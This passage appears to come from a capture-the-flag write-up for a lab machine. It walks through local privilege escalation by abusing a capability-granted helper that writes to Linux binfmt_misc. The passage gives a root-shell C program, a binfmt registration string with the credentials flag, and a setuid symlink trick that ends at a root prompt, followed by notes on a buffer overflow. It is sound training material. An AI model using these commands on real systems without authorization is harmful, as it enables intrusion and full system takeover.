        mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
        install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
        setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper

        @echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
        echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
                | tee /usr/lib/binfmt.d/emuemu.conf \
                | /usr/lib/emuemu/reg_helper

clean:
        rm -f -- $(TARGETS)
```

My attention is drawn to line 14 as it is providing the [CAP_DAC_OVERRIDE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override) capability to the `reg_helper` file, this means that `reg_helper` can write to any file on the system.

```bash
dev@retired:~/emuemu$ ls -la /usr/lib/emuemu/reg_helper
-rwxr-x--- 1 root dev 16864 Oct 13  2021 /usr/lib/emuemu/reg_helper
```
{: .nolineno }

We can run `reg_helper`, so let's first see what it is doing.

```c
#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    char cmd[512] = { 0 };

    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;

    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
        perror("write");
    if (close(fd) == -1)
        perror("close");

    return 0;
}
```

`reg_helper` is opening `/proc/sys/fs/binfmt_misc/register`, let's see what exactly is [binfmt_misc](https://docs.kernel.org/admin-guide/binfmt-misc.html).

> binfmt-misc allows you to invoke almost (for restrictions see below) every program by simply typing its name in the shell. To actually register a new binary type, you have to set up a string looking like `:name:type:offset:magic:mask:interpreter:flags` (where you can choose the : upon your needs) and echo it to `/proc/sys/fs/binfmt_misc/register`.
{: .prompt-info }

With this in mind, if we look again at the Makefile on `line 17`, what it is doing is registering a new binary type, because the input received by `reg_helper` is being passed as input to `binfmt_misc/register`. As we have execution permissions on `reg_helper`, then we can register our own binary type. 

There is a very important section stated in the `binfmt_misc` documentation, which reads as follows:

```
flags

  C - credentials
    Currently, the behavior of binfmt_misc is to calculate the credentials and security token of the new process according to the interpreter. When this flag is included, these attributes are calculated according to the binary. It also implies the O flag. This feature should be used with care as the interpreter will run with root permissions when a setuid binary owned by root is run with binfmt_misc.
```
{: .nolineno }

### Exploit binfmt_misc register

Therefore, the plan of attack would be as follows:
- create a binary that when executed returns a shell
- register a new binary type with a custom extension, so that when a file with that extension is executed, first launch our binary with the shell
- execute a setuid binary owned by root with the custom extension, so that it uses the same permissions and executes our shell as root.

We are going to create the binary so that it returns a shell when executed in the tmp folder.

```c
int main (void) {
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
```
{: .nolineno }

```bash
dev@retired:/tmp$ gcc supershell.c -o supershell
```
{: .nolineno }

Lets register a new binary type with a custom extension `V3`

```bash
dev@retired:/tmp$ echo ":v3he:E::V3::/tmp/supershell:C" | /usr/lib/emuemu/reg_helper
```
{: .nolineno }

Let's find a binary with setuid and create a symbolic link by changing the extension to the custom we registered before.

```bash
dev@retired:/tmp$ find / -perm -4000 2>/dev/null
[...]
/usr/bin/su
[...]

dev@retired:/tmp$ ln -s /usr/bin/su su.V3
dev@retired:/tmp$ ./su.V3
root@retired:/tmp# whoami
root
```
{: .nolineno }

## Beyond root

To give a little more context about the exploitation we have done on the activate_license binary, let's open it with [ghidra](https://ghidra-sre.org/) to see exactly what it does.

### Activate License binary main function

![Activate License Main Function](activate-license-main-func.png)

The first question is, why when the application crashes, doesn't the whole service go down? The answer to this is in `line 57`, every time a client connects, a new thread is created, so what it does is to crash the child thread, not the main one.

### Activate License binary activate function

![Activate License Activate Function](activate-license-activate-license-func.png)

This is the function that is responsible for activating the license, the vulnerability is clear, it is a basic buffer overflow. In `line 12`, a buffer of `512 bytes` is declared, but in `line 22`, when we read the content of the license file, it copies in the buffer of `512 bytes` the total of bytes corresponding to the length of the file and here is where the overflow takes place.